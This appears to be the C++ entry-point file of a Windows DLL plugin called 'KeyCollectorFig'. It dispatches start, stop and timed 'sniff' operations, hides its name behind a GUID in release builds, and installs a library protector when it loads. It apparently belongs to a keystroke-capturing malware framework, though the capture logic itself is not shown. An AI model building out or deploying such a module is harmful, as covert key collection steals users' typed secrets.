#include "Api.hpp"
#include "Exception.hpp"
#include "FigImplException.hpp"
#include "FigManager.hpp"
#include "Json.hpp"
#include "Trace.hpp"
#include "Operations/SniffTimeHandler.hpp"
#include "Operations/StartSniffHandler.hpp"
#include "Operations/StopSniffHandler.hpp"
#include "Protections/LibraryProtector.hpp"
#include "Utils/Strings.hpp"

#include <Windows.h>

Fig::FigInformation FigManager::g_information = {Api::FIG_ID, Api::VERSION_MAJOR, Api::VERSION_MINOR};
std::wstring FigManager::g_name =
#ifdef _DEBUG
	L"KeyCollectorFig";
#else
	L"{4731056E-D37A-4E5C-9A03-DB6091098827}";
#endif

std::shared_ptr<IOperationHandler> FigManager::make_handler(const Fig::OperationType operation_type,
                                                            [[maybe_unused]] const Buffer& operation_parameters,
                                                            std::unique_ptr<Event> operation_event)
{
	switch (operation_type)
	{
	case static_cast<Fig::OperationType>(Api::OperationType::START_SNIFF):
		return std::make_shared<StartSniffHandler>(std::move(operation_event));
	case static_cast<Fig::OperationType>(Api::OperationType::STOP_SNIFF):
		return std::make_shared<StopSniffHandler>(std::move(operation_event));
	case static_cast<Fig::OperationType>(Api::OperationType::SNIFF_TIME):
	{
		const Json parameters = Strings::to_string(operation_parameters);
		static constexpr auto DURATION_FIELD = "duration";
		Time::Duration duration = Time::Seconds(parameters[DURATION_FIELD].get<Time::Seconds::rep>());
		return std::make_shared<SniffTimeHandler>(duration, g_quit_event, std::move(operation_event));
	}
	default:
		throw FigImplException(Fig::FigCode::FAILED_UNSUPPORTED_OPERATION);
	}
}

void process_attach()
{
	TRACE(L"PROCESS ATTACH");
}

void process_detach()
{
	TRACE(L"PROCESS DETACH");
}

static std::unique_ptr<Protections::LibraryProtector> g_protector = nullptr;

BOOL APIENTRY DllMain([[maybe_unused]] const HINSTANCE hInstance,
                      [[maybe_unused]] const DWORD dwReason,
                      [[maybe_unused]] const LPVOID lpReserved)
{
	try
	{
		if (dwReason == DLL_PROCESS_ATTACH)
		{
			g_protector = std::make_unique<Protections::LibraryProtector>();
			process_attach();
		}
		if (dwReason == DLL_PROCESS_DETACH)
		{
			process_detach();
			g_protector.reset();
		}
		return TRUE;
	}
	CATCH_AND_TRACE()

	return FALSE;
}
